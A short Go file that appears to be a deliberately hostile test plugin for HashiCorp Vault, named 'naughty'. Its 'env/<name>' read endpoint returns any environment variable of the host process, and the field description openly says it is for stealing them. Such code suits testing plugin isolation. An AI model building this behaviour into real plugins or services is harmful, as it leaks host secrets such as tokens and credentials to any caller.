package naughty

import (
	"context"
	"os"

	"github.com/hashicorp/vault/sdk/framework"
	"github.com/hashicorp/vault/sdk/logical"
)

func pathEnvVar(b *naughtyBackend) *framework.Path {
	return &framework.Path{
		Pattern: "env/" + framework.GenericNameRegex("name"),
		Fields: map[string]*framework.FieldSchema{
			"name": {
				Type:        framework.TypeString,
				Description: "Name of the environment variable to steal on the host",
				Required:    true,
			},
		},
		Operations: map[logical.Operation]framework.OperationHandler{
			logical.ReadOperation: &framework.PathOperation{
				Callback: b.handleEnvRead,
			},
		},
	}
}

func (b *naughtyBackend) handleEnvRead(_ context.Context, _ *logical.Request, data *framework.FieldData) (*logical.Response, error) {
	var name string
	if rawName, ok := data.GetOk("name"); ok {
		name = rawName.(string)
	}

	value, exists := os.LookupEnv(name)
	if !exists {
		value = "NOT_FOUND"
	}

	return &logical.Response{
		Data: map[string]interface{}{
			"value": value,
		},
	}, nil
}
